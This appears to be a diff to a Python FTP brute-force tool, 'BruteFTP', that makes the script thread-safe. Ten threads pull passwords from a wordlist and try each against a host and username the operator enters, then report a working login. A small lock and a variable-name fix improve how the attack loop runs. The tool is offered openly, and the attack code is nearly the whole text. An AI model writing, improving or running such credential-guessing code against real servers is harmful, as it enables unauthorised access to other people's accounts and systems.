@@ -29,14 +29,16 @@ def connect(host, port, user, password):
     except ftplib.error_perm:
         return False
 
-def attack(host, port, user, q, stop):
+def attack(host, port, user, q, stop, lock):
     while not q.empty():
         if stop.is_set():  
             break
         password = q.get()
-        print(f"[{cyan}BruteFTP{clear}] {host}{cyan}:{clear}{port} User {cyan}:{clear} {user} Login {cyan}:{clear} {password}")
+        with lock:
+            print(f"[{cyan}BruteFTP{clear}] {host}{cyan}:{clear}{port} User {cyan}:{clear} {user} Login {cyan}:{clear} {password}")
         if connect(host, port, user, password):
-            print(f"[{yello}FIND{clear}] {user}{yello}:{clear}{password}")
+            with lock:
+                print(f"[{yellow}FIND{clear}] {user}{yellow}:{clear}{password}")
             stop.set()
             break
         q.task_done()
@@ -44,6 +46,7 @@ def attack(host, port, user, q, stop):
 def thread(host, port, user, passwords):
     q = queue.Queue()
     stop = threading.Event()
+    lock = threading.Lock()
 
     with open(passwords, "r", encoding="utf-8") as f:
         for password in f.read().splitlines():
@@ -51,7 +54,7 @@ def thread(host, port, user, passwords):
 
     threads = []
     for _ in range(10):
-        t = threading.Thread(target=attack, args=(host, port, user, q, stop))
+        t = threading.Thread(target=attack, args=(host, port, user, q, stop, lock))
         t.start()
         threads.append(t)
 
@@ -59,7 +62,6 @@ def thread(host, port, user, passwords):
         t.join()
 
 if __name__ == "__main__":
-    BruteFTP()
     host = input(f"[{cyan}+{clear}] Host {cyan}:{clear} ")
     port = int(input(f"[{cyan}+{clear}] Port {cyan}:{clear} "))
     user = input(f"[{cyan}*{clear}] Username {cyan}:{clear} ")
